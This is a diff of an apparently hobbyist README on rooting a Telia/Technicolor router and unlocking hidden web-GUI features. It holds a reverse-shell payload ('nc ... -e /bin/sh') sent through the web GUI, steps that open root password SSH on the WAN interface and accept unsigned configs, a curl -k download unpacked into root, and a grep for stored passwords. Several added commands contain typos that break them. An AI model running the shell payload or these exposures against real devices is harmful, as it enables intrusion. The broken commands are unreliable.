@@ -25,17 +25,19 @@ restore the router, what are they doing with this data? This is really unpleasan
     uci add_list web.uidefault.upgradefw_role='admin'
     uci commit
     
+###### If you wanna become a superuser user or telia admin without do any major changes just change admin role: 
+
+![Screenshot](files/wuseman.pwned.telia.png)
+
+     uci set web.usr_Administrator.role='superuser'
+    
 ![Screenshot](files/upgrade_firmware.png)
 
 ##### Add your own user without any extra tools.
 
 ![Screenshot](files/adduser.gif)
 
-##### wuseman got 100% control over Telia and Superuser roles and we are now able to add our user to become a Telia user:
-
-![Screenshot](files/wuseman.pwned.telia.png)
-
-##### If things got fucked anytime because of to low space or something similiar when you just get stuck, then mtd will be your rescue, this will restore router to factory default 100%: 
+##### When things gets broken you can run the command below and you will reset * settings:
 
 ![Screenshot](files/erase-rootfs.gif)
 
@@ -44,6 +46,8 @@ restore the router, what are they doing with this data? This is really unpleasan
 ##### When you gonna install custom packages from any arch there might be a little problem with term, this is how you will fix it:
 
 ![Screenshot](files/install-opkg-packages.gif)
+
+###### With below setting you will be allowed to install packages from more repos:
 
      cat > /etc/opkg.conf
 
@@ -58,7 +62,7 @@ restore the router, what are they doing with this data? This is really unpleasan
 
 # HOWTO GET ROOT ACCESS FROM WEBGUI:
 
-##### Let us begin to hack for real now.. Set up a netcat listener on your machine, and adjust any firewall rules to allow an inbound connection:
+##### Let's begin. Fire up a terminal of any kind and just run the awesome netcat tool and listen on a port.
 
     nc -lvvp [machine_port]
 
@@ -66,18 +70,56 @@ restore the router, what are they doing with this data? This is really unpleasan
 
     :::::::`nc [machine_IP] [machine_port] -e /bin/sh`
 
-##### When you have successfully logged in, set a new root password, edit /etc/config/dropbear (THEY ARE USING 60022 AS DEFUALT PORT IN THIS VERSION NOT 22 AS BEFORE)
+###### In the netcat window you will see something similiar and that means you are in:
 
-    passwd                                                                             
-    sed -i "s/'option enable '0'/option enable '1'/g" /etc/config/dropbear    
-    /etc/init.d/dropbear restart                                             
-    exit                                                                   
-    ssh -p 60022 root@192.168.1.1                                           
+    listening on [any] 1337 ...
+    connect to [192.168.1.144] from router [192.168.1.1] 40980
 
-##### Install packages from any arch:
+##### Now we got full control. Let us now allow SSH permanent, copy paste commands below:
 
+    rm /etc/dropbear/*
+    uci delete dropbear.mgmt &> /dev/null
+    uci delete dropbear.mgmt.PasswordAuth &> /dev/null
+    uci delete dropbear.mgmt.RootPasswordAuth &> /dev/null
+    uci delete dropbear.mgmt.Port &> /dev/null 
+    uci delete dropbear.mgmt.Interfac e&> /dev/null
+    uci delete dropbear.mgmt.AllowedClientIPs &> /dev/null
+    uci delete dropbear.mgmt.enable &> /dev/null
+    uci delete dropbear.mgmt.IdleTimeout &> /dev/null 
+    uci set dropbear.wan=dropbear
+    uci set dropbear.wan.PasswordAuth='off'
+    uci set dropbear.wan.RootPasswordAuth='on'
+    uci set dropbear.wan.Port='22'
+    uci set ropbear.wan.Interface='wan'
+    uci set dropbear.wan.AllowedClientIPs='wanip'
+    uci set dropbear.wan.IdleTimeout='3600'
+    uci set dropbear.wan.enable='1'
+    uci set dropbear.lan=dropbear
+    uci set ropbear.lan.PasswordAuth='on'
+    uci set dropbear.lan.RootPasswordAuth='on'
+    uci set dropbear.lan.Interface='lan'
+    uci set dropbear.lan.enable='1'
+    uci set dropbear.lan.IdleTimeout='3600'
+    uci set dropbear.lan.Port='22'
+    uci set web.uidefault.nsplink='https://www.wuseman.com'
+    uci set system.config.export_plaintext='1'
+    uci set system.config.export_unsigned='1'
+    uci set system.config.import_plaintext='1'
+    uci set system.config.import_unsigned='1'
+    uci set clash.main_config=single_config
+    uci set clash.main_config.module_path='/usr/lib/lua/clash/modules'
+    uci set clash.main_config.log_level='3'
+    uci set clash.engineer=user
+    uci set clash.engineer.ssh='1'
+    uci set clash.engineer.telnet='1'
+    uci set clash.engineer.serial='1'
+    uci set clash.engineer.ssh_key='username@hostname'
+    uci set web.uidefault.upgradefw_role='adminusi ch'
+    /etc/init.d/dropbear restart; uci commit; exit
+    ssh root@192.168.1.1 "tee -a /etc/dropbear/authorized_keys" < ~/.ssh/id_rsa.pub; ssh root@192.168.1.1
+    
 
-
+  
 ##### If WEBGUI is broken then you allways can reset your router with 'rtfd --all' command, use 'rtfd --soft' for keep settings.
 
 ![Screenshot](files/reset-router-with-rtfd-if-webgui-crashed.gif)
@@ -90,50 +132,97 @@ restore the router, what are they doing with this data? This is really unpleasan
 
 ![Screenshot](files/banner_before_default.png)
 
-##### I got many questions in my mail inbox how-to hack the Telia router with minimal settings to get fully unlock it with and root the device and get a brand new interface from Technicolor wich is default with _all_ default settings. So i decided to create a preview here at top to show you all how this is done, huge respect  to the italians that made this public and these who maintaince the GUI with new upgrades.
+###### When you have root access on your router you will be able to unlock rootfs_data and install a very powerful gui vs original from Telia thanks to Ansuel and other awesoem developers by below command:
 
-###### When you have root access to your router see how to get root access above on the Telia firmware.
+    curl -k https://repository.ilpuntotecnico.com/files/Ansuel/AGTEF/GUI.tar.bz2 --output /tmp/GUI.tar.bz2; bzcat /tmp/GUI.tar.bz2 | tar -C / -xvf -; /etc/init.d/rootdevice force; reboot
 
-###### Lets root it, then do following:
+    Now go visit http://192.168.1.1 and you will see a brand new GUI interface. Default login: username: admin - password:admin
 
-![Screenshot](files/reset_router.gif)
-
-    curl -k https://repository.ilpuntotecnico.com/files/Ansuel/AGTEF/GUI.tar.bz2 --output /tmp/GUI.tar.bz2; bzcat /tmp/GUI.tar.bz2 | tar -C / -xvf -; /etc/init.d/rootdevice force
-
-###### Its time to show your patience now, you should see a messeage: Root Script: Rooting in progress.. Wait few seconds, and now reboot router. Thats it, enjoy your fully unlocked router with alot of new settings! When you will  try to login after this process is done, it will look a like:
+##### This is how it will look a like: 
 
 ![Screenshot](files/login-screen-after-root.png)
 
-##### Stats view:
+##### Screenshot on Stats view:
 
 ![Screenshot](files/stats-view.gif)
 
-##### Telstra Extension, really nice overview: 
+##### Telstra Extension: 
 
 ![Screenshot](files/telstra-gui.png)
 
-##### WEBUI (LUCI - REALLY ADVANCED - HIGH RISK - MIGHT BRICK YOUR DEVICE - I BRICKED MY OLD)
+##### I got LUCI installed but i do not recommend it and i do not use it myself, just tried for fun:  
 
 ![Screenshot](files/wusemans_pwnS-100-percent-complete-hacking.png)
 
-##### Printing some other examples below from Ansuels repo: 
-
-![Screenshot](files/tim.png)
-![Screenshot](files/dark-white.png)
-![Screenshot](files/stats-login-after-root.png)
-![Screenshot](files/webgui-tour.gif)
-
-##### Banner (AFTER)
-
-![Screenshot](files/banner_when_done.png)
-
-##### This is how it can be if you will stay with Telia gui (Recommended):
+##### This is an example for default setup with more lua cards:
 
 ![Screenhot](files/telia_added_few_features.png)
 
-##### Mount / as read and write
+##### Mount root as read and write
 
     mount -o remount,rw /
+
+##### If you are lazy and want things sorted as i do, then run below command: 
+
+![Screenshot](files/sorted-dirs.gif)
+
+    mkdir uci_settings; cd uci_settings;
+    for settings in $(uci show | awk -F. '{print $1}' | uniq);do uci show $settings > $settings;done
+
+##### Setup your dns provider from commandline:
+
+    cat > /etc/config/ddns
+    config service 'myddns_ipv4'
+        option interface 'wan'
+        option ip_source 'network'
+        option ip_network 'wan'
+        option use_https '1'
+        option cacert 'IGNORE'
+        option force_interval '36500'
+        option force_unit 'days'
+        option enabled '1'
+        option password 'password'
+        option username 'domain.com'
+        option service_name 'loopia.se'
+        option lookup_host 'domain.com'
+        option domain 'domain.com'
+
+###### List product, serial, ssid prefix etc by below command:
+
+    cat /var/hostapd.env | sed 's/^_//g' | sed 's/=/ ===> /g'
+    COMPANY_NAME ===> Technicolor
+    PROD_NAME ===> MediaAccess TG
+    PROD_NUMBER ===> Telia WiFi-router Plus v3
+    PROD_FRIENDLY_NAME ===> Telia WiFi-router Plus v3
+    VARIANT_FRIENDLY_NAME ===> TG799TSvac Xtream
+     SSID_SERIAL_PREFIX ===> TNCAP
+    BOARD_NAME ===> VBNT-H
+    BOARD_SERIAL_NBR ===> SECRET
+    PROD_SERIAL_NBR ===> SECRET
+    MACADDR ===> E0-B9-15-23-22-54
+    WL_MACADDR ===> E0-B9-15-23-45-55
+
+####### List all files where "password=" is stored: 
+
+    sudo grep -rP -w -e 'password=' .| grep -v Binary | grep -v ddns
+    
+###### List all files where you can find your serial: 
+
+    find . -type f | xargs grep -e 'SERIAL' | cut -d':' -f1 | grep / | uniq
+
+##### Setup local hostnames:
+
+     cat >> /etc/config/dhcp
+     config host
+        option name 'moms.ipad'
+        option mac 'macaddr'
+        option ip 'prefered.localip''
+
+    config host
+        option name 'dads.linux.laptop'
+        option mac 'macaddr'
+        option ip 'prefered.localip'
+
 
 ##### First of all we want to change telia > admin in all lp files.
 
@@ -143,143 +232,114 @@ restore the router, what are they doing with this data? This is really unpleasan
     
 ![Screenshot](files/beforeandafter.png)
 
-##### Get VPN access in webgui:
+##### Below will add a new VPN modal in webgui ( Confirmed to work on 16.2 Jade + 17.2 Mint ):
 
+    cat >> /etc/config/web
+       list rules 'l2tpipsecservermodal'
+       config rule 'l2tpipsecservermodal'
+       option target '/modals/l2tp-ipsec-server-modal.lp'
+       list roles 'admin'
+       list roles 'engineer'
+    
 ![Screenshot](files/vpn-in-webgui.png)
-
-###### Add l2tpip to rules: 
-
-    list rules 'l2tpipsecservermodal'
-
-###### Now add below to /etc/config/web
-
-    config rule 'l2tpipsecservermodal'
-    option target '/modals/l2tp-ipsec-server-modal.lp'
-    list roles 'admin'
-    list roles 'engineer'
 
 ### IT IS VERY IMPORTANT TO ADD BELOW COMMANDS IN SAME ORDER I LISTED THEM. 
 ###### IF YOU ADD THEM IN WRONG ORDER YOU GET A ERROR MESSAGE: 'uci: Invalid Argument'
 
 ##### Rules
 
-     add_list web.uidefault.upgradefw_role='admin'
-     set web.natalghelpermodal=rule
-     set web.relaymodal=rule
-     set web.systemmodal=rule
-     set web.iproutesmodal=rule
-     set web.mmpbxinoutgoingmapmodal=rule
-     set web.ltedoctor=rule
-     set web.ltemodal=rule
-     set web.lteprofiles=rule
-     set web.ltesim=rule
-     set web.ltesms=rule
-     set web.logconnections=rule
-     set web.logviewer=rule
-     set web.logviewer.roles=rule
-     set tod.global.enabled='1'
-     set mobiled.globals.enabled='1'
-     set mobiled.device_defaults.enabled='1'
-     set web.uidefault.nsplink='https://sendit.nu'
-     commit; /etc/init.d/nginx restart
+     uci add_list web.uidefault.upgradefw_role='admin'
+     uci set web.natalghelpermodal=rule
+     uci set web.relaymodal=rule
+     uci set web.systemmodal=rule
+     uci set web.iproutesmodal=rule
+     uci set web.mmpbxinoutgoingmapmodal=rule
+     uci set web.ltedoctor=rule
+     uci set web.ltemodal=rule
+     uci set web.lteprofiles=rule
+     uci set web.ltesim=rule
+     uci set web.ltesms=rule
+     uci set web.logconnections=rule
+     uci set web.logviewer=rule
+     uci set web.logviewer.roles=rule
+     uci set tod.global.enabled='1'
+     uci set mobiled.globals.enabled='1'
+     suci et mobiled.device_defaults.enabled='1'
+
+     uci commit; /etc/init.d/nginx restart
 
 ##### Ruleset
 
-     add_list web.ruleset_main.rules=xdsllowmodal
-     add_list web.ruleset_main.rules=systemmodal
-     add_list web.ruleset_main.rules=natalghelpermodal
-     add_list web.ruleset_main.rules=diagnostics
-     add_list web.ruleset_main.rules=basicviewaccesscodemodal
-     add_list web.ruleset_main.rules=basicviewwifiguestmodal
-     add_list web.ruleset_main.rules=basicviewwifiguest5GHzmodal
-     add_list web.ruleset_main.rules=basicviewwifipskmodal
-     add_list web.ruleset_main.rules=basicviewwifipsk5GHzmodal
-     add_list web.ruleset_main.rules=basicviewwifissidmodal
-     add_list web.ruleset_main.rules=basicviewwifissid5GHzmodal
-     add_list web.ruleset_main.rules=relaymodal
-     add_list web.ruleset_main.rules=iproutesmodal
-     add_list web.ruleset_main.rules=mmpbxinoutgoingmapmodal
-     add_list web.ruleset_main.rules=mmpbxstatisticsmodal
-     commit; /etc/init.d/nginx restart
+     uci add_list web.ruleset_main.rules=xdsllowmodal
+     uci add_list web.ruleset_main.rules=systemmodal
+     uci add_list web.ruleset_main.rules=natalghelpermodal
+     uci add_list web.ruleset_main.rules=diagnostics
+     uci add_list web.ruleset_main.rules=basicviewaccesscodemodal
+     uci add_list web.ruleset_main.rules=basicviewwifiguestmodal
+     uci add_list web.ruleset_main.rules=basicviewwifiguest5GHzmodal
+     uci add_list web.ruleset_main.rules=basicviewwifipskmodal
+     uci add_list web.ruleset_main.rules=basicviewwifipsk5GHzmodal
+     uci add_list web.ruleset_main.rules=basicviewwifissidmodal
+     uci add_list web.ruleset_main.rules=basicviewwifissid5GHzmodal
+     uci add_list web.ruleset_main.rules=relaymodal
+     uci add_list web.ruleset_main.rules=iproutesmodal
+     uci add_list web.ruleset_main.rules=mmpbxinoutgoingmapmodal
+     uci add_list web.ruleset_main.rules=mmpbxstatisticsmodal
+     uci commit; /etc/init.d/nginx restart
 
 ##### Target ( You will get even more stuff in webinterface after you run below commands )
 
-     set web.mmpbxinoutgoingmapmodal.target='/modals/mmpbx-inoutgoingmap-modal.lp'
-     set web.iproutesmodal.target='/modals/iproutes-modal.lp'
-     set web.systemmodal.target='/modals/system-modal.lp'
-     set web.relaymodal.target='/modals/relay-modal.lp'
-     set web.natalghelpermodal.target='/modals/nat-alg-helper-modal.lp'
-     set web.diagnosticstcpdumpmodal.target='/modals/diagnostics-tcpdump-modal.lp'
-     set web.natalghelpermodal.target='/modals/basicview-accesscode-modal.lp'
-     set web.natalghelpermodal.target='/modals/basicview-wifiguest-modal.lp'
-     set web.natalghelpermodal.target='/modals/basicview-wifiguest5GHz-modal.lp'
-     set web.natalghelpermodal.target='/modals/basicview-wifipsk-modal.lp'
-     set web.natalghelpermodal.target='/modals/basicview-wifipsk5GHz-modal.lp'
-     set web.natalghelpermodal.target='/modals/basicview-wifissid-modal.lp'
-     set web.natalghelpermodal.target='/modals/basicview-wifissid5GHz-modal.lp'
-     set web.ltemodal.target='/modals/lte-modal.lp'
-     set web.ltedoctor.target='/modals/lte-doctor.lp'
-     set web.lteprofiles.target='/modals/lte-profiles.lp'
-     set web.logconnections.target='/modals/log-connections-modal.lp'
-     set web.logviewer.target='/modals/logviewer-modal.lp'
-     set web.ltesms.target='/modals/lte-sms.lp'
-     set web.ltesim.target='/modals/lte-sim.lp'
-     set web.xdsllowmodal.target='/modals/xdsl-low-modal.lp'
-     commit; /etc/init.d/nginx restart
+     uci set web.mmpbxinoutgoingmapmodal.target='/modals/mmpbx-inoutgoingmap-modal.lp'
+     uci set web.iproutesmodal.target='/modals/iproutes-modal.lp'
+     uci set web.systemmodal.target='/modals/system-modal.lp'
+     uci  set web.relaymodal.target='/modals/relay-modal.lp'
+     uci set web.natalghelpermodal.target='/modals/nat-alg-helper-modal.lp'
+     uci set web.diagnosticstcpdumpmodal.target='/modals/diagnostics-tcpdump-modal.lp'
+     uci set web.natalghelpermodal.target='/modals/basicview-accesscode-modal.lp'
+     uci set web.natalghelpermodal.target='/modals/basicview-wifiguest-modal.lp'
+     uci set web.natalghelpermodal.target='/modals/basicview-wifiguest5GHz-modal.lp'
+     uci set web.natalghelpermodal.target='/modals/basicview-wifipsk-modal.lp'
+     uci set web.natalghelpermodal.target='/modals/basicview-wifipsk5GHz-modal.lp'
+     uci set web.natalghelpermodal.target='/modals/basicview-wifissid-modal.lp'
+     uci set web.natalghelpermodal.target='/modals/basicview-wifissid5GHz-modal.lp'
+     uci set web.ltemodal.target='/modals/lte-modal.lp'
+     uci set web.ltedoctor.target='/modals/lte-doctor.lp'
+     uci set web.lteprofiles.target='/modals/lte-profiles.lp'
+     uci set web.logconnections.target='/modals/log-connections-modal.lp'
+     uci set web.logviewer.target='/modals/logviewer-modal.lp'
+     uci set web.ltesms.target='/modals/lte-sms.lp'
+     uci set web.ltesim.target='/modals/lte-sim.lp'
+     uci set web.xdsllowmodal.target='/modals/xdsl-low-modal.lp'
+     uci commit; /etc/init.d/nginx restart
 
 ##### Roles ( You will see new stuff on webinterface after you run below commands)
 
-     add_list web.assistancemodal.roles='admin' 
-     add_list web.usermgrmodal.roles='admin'
-     add_list web.cwmpconf.roles='admin'
-     add_list web.todmodal.roles='admin'
-     add_list web.iproutesmodal.roles='admin'
-     add_list web.natalghelper.roles='admin'
-     add_list web.mmpbxglobalmodal.roles='admin' 
-     add_list web.mmpbxprofilemodal.roles='admin' 
-     add_list web.parentalblock.roles=admin
-     add_list web.mmpbxinoutgoingmapmodal.roles='admin'
-     add_list web.systemmodal.roles='admin'
-     add_list web.relaymodal.roles='admin'
-     add_list web.natalghelpermodal.roles='admin'
-     add_list web.diagnosticstcpdumpmodal.roles='admin'
-     add_list web.ltedoctor.roles="admin"
-     add_list web.ltemodal.roles="admin"
-     add_list web.lteprofiles.roles="admin"
-     add_list web.xdsllowmodal.roles='admin'
-     add_list web.ltesim.roles="admin"
-     add_list web.logconnections.roles="admin"
-     add_list web.logviewer.roles="admin"
-     add_list web.logconnections.roles="admin"
-     add_list web.home.roles='admin'
-     add_list web.ltesms.roles='admin'
-     add_list web.logviewer.roles="admin"
+     uci add_list web.assistancemodal.roles='admin' 
+     uci add_list web.usermgrmodal.roles='admin'
+     uci add_list web.cwmpconf.roles='admin'
+     uci add_list web.todmodal.roles='admin'
+     uci add_list web.iproutesmodal.roles='admin'
+     uci add_list web.natalghelper.roles='admin'
+     uci add_list web.mmpbxglobalmodal.roles='admin' 
+     uci add_list web.mmpbxprofilemodal.roles='admin' 
+     uci add_list web.parentalblock.roles=admin
+     uci add_list web.mmpbxinoutgoingmapmodal.roles='admin'
+     uci add_list web.systemmodal.roles='admin'
+     uci add_list web.relaymodal.roles='admin'
+     uci add_list web.natalghelpermodal.roles='admin'
+     uci add_list web.diagnosticstcpdumpmodal.roles='admin'
+     uci add_list web.ltedoctor.roles="admin"
+     uci add_list web.ltemodal.roles="admin"
+     uci add_list web.lteprofiles.roles="admin"
+     uci add_list web.xdsllowmodal.roles='admin'
+     uci add_list web.ltesim.roles="admin"
+     uci add_list web.logconnections.roles="admin"
+     uci add_list web.logviewer.roles="admin"
+     uci add_list web.logconnections.roles="admin"
+     uci add_list web.home.roles='admin'
+     uci add_list web.ltesms.roles='admin'
+     uci add_list web.logviewer.roles="admin"
      commit; /etc/init.d/nginx restart
-
-##### Misc
-
-    uci del_list mwan.acsreffileserv.policy='mgmt_only'
-    uci del_list mwan.acsrefloadb.policy='mgmt_only'
-    uci del_list mwan.acsprodloadb.policy='mgmt_only'
-    uci add_list mwan.acsreffileserv.policy='mgmt'
-    uci add_list mwan.acsrefloadb.policy='mgmt'
-    uci add_list mwan.acsprodloadb.policy='mgmt'
-    uci add_list mwan.acsreffileserv.policy='wan'
-    uci add_list mwan.acsrefloadb.policy='wan'
-    uci add_list mwan.acsprodloadb.policy='wan'
-    uci add_list mwan.acsreffileserv.policy='lan'
-    uci add_list mwan.acsrefloadb.policy='lan'
-    uci add_list mwan.acsprodloadb.policy='lan'
-    uci del_list mwan.acsreffileserv.dest_ip='10.54.3.204/32'
-    uci del_list mwan.acsrefloadb.dest_ip='10.54.3.210/32'
-    uci add_list mwan.acsprodloadb.dest_ip='xxx.xxx.xxx.0/24'
-    uci add_list mwan.acsprodloadb.dest_ip='xxx.xxx.xxx.0/24'
-    uci add_list mwan.acsprodloadb.dest_ip='192.168.1.0/24'
-    uci add_list mwan.acsprodloadb.dest_ip='192.168.1.0/24'
-    uci del_list mwan.acsreffileserv.dest_ip='10.54.3.204/32'
-    uci add_list mwan.acsreffileserv.dest_ip='xxx.xxx.xxx.0/24'
-    uci add_list mwan.acsreffileserv.dest_ip='192.168.1.0/24'
-    uci commit; /etc/init.d/nginx restart
 
 ##### All kind of stuff for webgui (Nothing special, edit them after your needs)
 
@@ -287,9 +347,9 @@ restore the router, what are they doing with this data? This is really unpleasan
     sed -i 's/Technicolor/This router has been hacked by wuseman/g' /www/docroot/*.lp
     sed -i 's/Technicolor/This router has been hacked by wuseman/g' /www/docroot/*.lp
 
-##### EDIT YOUR CONFIG FILES MANUALLY, HERE IS SOME EXAMPLES
+##### IF YOU WANNA BE ELITE AND EDIT THE SETTINGS FROM COMMANDLINE INSTEAD HERE IS SOME EXAMPLES YOU CAN USE:
 
-###### DHCP
+###### Give a device on your localnetwork a custom hostname: 
 
     cat >> /etc/config/dhcp
     # WUSEMAN WAS HERE
@@ -300,7 +360,7 @@ restore the router, what are they doing with this data? This is really unpleasan
     option mac 'macaddr'
     option ip 'localip'
 
-###### FIREWALL
+###### Open a new port: 
 
     cat >> /etc/config/firewall 
     # WUSEMAN WAS HERE
@@ -435,11 +495,11 @@ restore the router, what are they doing with this data? This is really unpleasan
      cat /tmp/dhcp.leases
      1534969000 macaddr lanip machine macaddr
 
-##### To view all ipv4 adresses in uci settings:
+##### To view all ipv4 adresses from uci settings:
 
-     show | uci show | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
+     uci show | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
      
-##### Add new modals:
+##### Example on how-to add a new new modal:
 
     uci set web.modalsmodalrule=rule
     uci set web.ruleset_main.rules=modalsmodalsrule
@@ -447,11 +507,11 @@ restore the router, what are they doing with this data? This is really unpleasan
     uci set web.l2tpipsecservermodal.roles='roles'
     uci commit; /etc/init.d/nginx restart
 
-##### Enable or disable nginx remote: 
+##### Enable/Disable web gui:
 
      uci set web.remote.active='1'
 
-##### To view arp log
+##### List arp.log
  
      cat /tmp/arp.log
      root@OpenWrt:/tmp# cat /tmp/arp.log 
@@ -460,9 +520,9 @@ restore the router, what are they doing with this data? This is really unpleasan
      mgmt_ip          0x1         0x2         X0:X0:X0:X0:X0:X0     *        vlan_mgmt
      wanip            0x1         0x2         X0:X0:X0:X0:X0:X0     *        eth4
      
-##### List mac-addresses.
+##### List all interfaces mac-addresses
 
-    ifconfig -a  | sed '/eth\|wl/!d;s/ Link.*HWaddr//
+    ifconfig -a  | sed '/eth\|wl/!d;s/ Link.*HWaddr//'
     eth0      X0:X0:X0:X0:X0:X0  
     eth1      X0:X0:X0:X0:X0:X0 
     eth2      X0:X0:X0:X0:X0:X0  
@@ -478,7 +538,7 @@ restore the router, what are they doing with this data? This is really unpleasan
     wl0_1     X0:X0:X0:X0:X0:X0   
     wl0_2     X0:X0:X0:X0:X0:X0  
    
-##### Remove Monitor Of Traffic:
+##### Remove trafficmon settings:
 
      uci delete system.@trafficmon[0].interface=''
      uci delete system.@trafficmon[0].minute=''
@@ -515,11 +575,6 @@ restore the router, what are they doing with this data? This is really unpleasan
 
     cat /etc/resolv.conf
     
-##### Edit nsplink to something else (where you get redirected when you click on the logo at top) 
-
-    uci set web.uidefault.nsplink='https://sendit.nu'
-
- 
 ##### Enable or Disable WWAN support (mobiled)
 
      uci set mobiled.globals.enabled='1'
@@ -535,44 +590,6 @@ restore the router, what are they doing with this data? This is really unpleasan
      cat /tmp/dhcp.leases
      1534969000 macaddr lanip machine macaddr
      
-##### To view arp log
- 
-     cat /tmp/arp.log
-     root@OpenWrt:/tmp# cat /tmp/arp.log 
-     IP address       HW type     Flags       HW address            Mask     Device
-     lanip            0x1         0x2         X0:X0:X0:X0:X0:X0      *        br-lan
-     mgmt_ip          0x1         0x2         X0:X0:X0:X0:X0:X0     *        vlan_mgmt
-     wanip            0x1         0x2         X0:X0:X0:X0:X0:X0     *        eth4
-     
-##### List mac-addr.
-
-    ifconfig -a  | sed '/eth\|wl/!d;s/ Link.*HWaddr//
-    eth0      X0:X0:X0:X0:X0:X0  
-    eth1      X0:X0:X0:X0:X0:X0 
-    eth2      X0:X0:X0:X0:X0:X0  
-    eth3      X0:X0:X0:X0:X0:X0 
-    eth4      X0:X0:X0:X0:X0:X0 
-    eth5      X0:X0:X0:X0:X0:X0 
-    vlan_eth0 X0:X0:X0:X0:X0:X0 
-    vlan_eth1 X0:X0:X0:X0:X0:X0  
-    vlan_eth2 X0:X0:X0:X0:X0:X0   
-    vlan_eth3 X0:X0:X0:X0:X0:X0  
-    vlan_eth5 X0:X0:X0:X0:X0:X0 
-    wl0       X0:X0:X0:X0:X0:X0 
-    wl0_1     X0:X0:X0:X0:X0:X0   
-    wl0_2     X0:X0:X0:X0:X0:X0  
-   
-##### Disable Monitor Of Traffic
-
-     uci set system.@trafficmon[0].interface=''
-     uci set system.@trafficmon[0].minute=''
-     uci set system.@trafficmon[1].interface=''
-     uci set system.@trafficmon[1].minute=''
-     uci set system.@trafficmon[2].interface=''
-     uci set system.@trafficmon[2].minute=''
-     uci set system.@trafficmon[3]=trafficmon
-     uci set system.@trafficmon[3].interface=''
-     uci set system.@trafficmon[3].minute=''
 
 ##### Remove telia from all roles: 
 
@@ -619,95 +636,6 @@ restore the router, what are they doing with this data? This is really unpleasan
     uci delete web_back.mmpbxservicemodal.roles='telia' 
     uci delete web_back.mmpbxdectmodal.roles='telia' 
 
-##### And now add our admin or engineer role to these rules instead, set will override current config so you its not needed to run above if you want to add admin to these settings instead.
-
-    uci set web_back.uidefault.upgradefw_role='admin'
-    uci set web_back.usr_assist.role='admin'
-    uci set web_back.gateway.roles='admin' 
-    uci set web_back.login.roles='admin' 
-    uci set web_back.password.roles='admin' 
-    uci set web_back.homepage.roles='admin' 
-    uci set web_back.gatewaymodal.roles='admin' 
-    uci set web_back.broadbandmodal.roles='admin' 
-    uci set web_back.internetmodal.roles='admin' 
-    uci set web_back.wirelessmodal.roles='admin' 
-    uci set web_back.wirelessclientmodal.roles='admin' 
-    uci set web_back.wirelessqrcodemodal.roles='admin' 
-    uci set web_back.ethernetmodal.roles='admin' 
-    uci set web_back.devicemodal.roles='admin' 
-    uci set web_back.wanservices.roles='admin' 
-    uci set web_back.firewallmodal.roles='admin' 
-    uci set web_back.diagnosticsconnectionmodal.roles='admin' 
-    uci set web_back.diagnosticsnetworkmodal.roles='admin' 
-    uci set web_back.diagnosticspingmodal.roles='admin' 
-    uci set web_back.diagnosticsxdslmodal.roles='admin' 
-    uci set web_back.diagnosticsigmpproxymodal.roles='admin' 
-    uci set web_back.assistancemodal.roles='admin' 
-    uci set web_back.usermgrmodal.roles='admin' 
-    uci set web_back.syslogmodal.roles='admin' 
-    uci set web_back.dmzmodal.roles='admin' 
-    uci set web_back.contentsharing.roles='admin' 
-    uci set web_back.parentalmodal.roles='admin'
-    uci set web_back.iptv.roles='admin'
-    uci set web_back.home.roles='admin'
-    uci set web_back.accesscode.roles='admin'
-    uci set web_back.wifissid.roles='admin'
-    uci set web_back.wifipsk.roles='admin'
-    uci set web_back.wifiguest.roles='admin'
-    uci set web_back.wifissid5GHz.roles='admin'
-    uci set web_back.wifipsk5GHz.roles='admin'
-    uci set web_back.wifiguest5GHz.roles='admin'
-    uci set web_back.mmpbxglobalmodal.roles='admin' 
-    uci set web_back.mmpbxprofilemodal.roles='admin' 
-    uci set web_back.mmpbxinoutgoingmodal.roles='admin' 
-    uci set web_back.mmpbxservicemodal.roles='admin' 
-    uci set web_back.mmpbxdectmodal.roles='admin' 
-
-##### Add another role if you want, then use add_list instead of set:
-
-    uci add_list web_back.uidefault.upgradefw_role='engineer'
-    uci add_list web_back.usr_assist.role='engineer'
-    uci add_list web_back.gateway.roles='engineer' 
-    uci add_list web_back.login.roles='engineer' 
-    uci add_list web_back.password.roles='engineer' 
-    uci add_list web_back.homepage.roles='engineer' 
-    uci add_list web_back.gatewaymodal.roles='engineer' 
-    uci add_list web_back.broadbandmodal.roles='engineer' 
-    uci add_list web_back.internetmodal.roles='engineer' 
-    uci add_list web_back.wirelessmodal.roles='engineer' 
-    uci add_list web_back.wirelessclientmodal.roles='engineer' 
-    uci add_list web_back.wirelessqrcodemodal.roles='engineer' 
-    uci add_list web_back.ethernetmodal.roles='engineer' 
-    uci add_list web_back.devicemodal.roles='engineer' 
-    uci add_list web_back.wanservices.roles='engineer' 
-    uci add_list web_back.firewallmodal.roles='engineer' 
-    uci add_list web_back.diagnosticsconnectionmodal.roles='engineer' 
-    uci add_list web_back.diagnosticsnetworkmodal.roles='engineer' 
-    uci add_list web_back.diagnosticspingmodal.roles='engineer' 
-    uci add_list web_back.diagnosticsxdslmodal.roles='engineer' 
-    uci add_list web_back.diagnosticsigmpproxymodal.roles='engineer' 
-    uci add_list web_back.assistancemodal.roles='engineer' 
-    uci add_list web_back.usermgrmodal.roles='engineer' 
-    uci add_list web_back.syslogmodal.roles='engineer' 
-    uci add_list web_back.dmzmodal.roles='engineer' 
-    uci add_list web_back.iproutesmodal.roles=
-    uci add_list web_back.contentsharing.roles='engineer' 
-    uci add_list web_back.parentalmodal.roles='engineer'
-    uci add_list web_back.iptv.roles='engineer'
-    uci add_list web_back.home.roles='engineer'
-    uci add_list web_back.accesscode.roles='engineer'
-    uci add_list web_back.wifissid.roles='engineer'
-    uci add_list web_back.wifipsk.roles='engineer'
-    uci add_list web_back.wifiguest.roles='engineer'
-    uci add_list web_back.wifissid5GHz.roles='engineer'
-    uci add_list web_back.wifipsk5GHz.roles='engineer'
-    uci add_list web_back.wifiguest5GHz.roles='engineer'
-    uci add_list web_back.mmpbxglobalmodal.roles='engineer' 
-    uci add_list web_back.mmpbxprofilemodal.roles='engineer' 
-    uci add_list web_back.mmpbxinoutgoingmodal.roles='engineer' 
-    uci add_list web_back.mmpbxservicemodal.roles='engineer' 
-    uci add_list web_back.mmpbxdectmodal.roles='engineer' 
-
 ##### Disable Time of Day ACL rules
 
      uci set tod.global.enabled='0'
@@ -719,36 +647,7 @@ restore the router, what are they doing with this data? This is really unpleasan
 ##### List installed packages in a tree:
 
     echo $(opkg list_installed | awk '{ print $1 }') | xargs -n 1
-     
-##### For login with debug mode enabled, then please go to:
-     
-     http://192.168.1.1/?debug=1
-      
-#### Login to ssh without any password:
-
-##### Generate the Key Pair on your pc (not router):
-
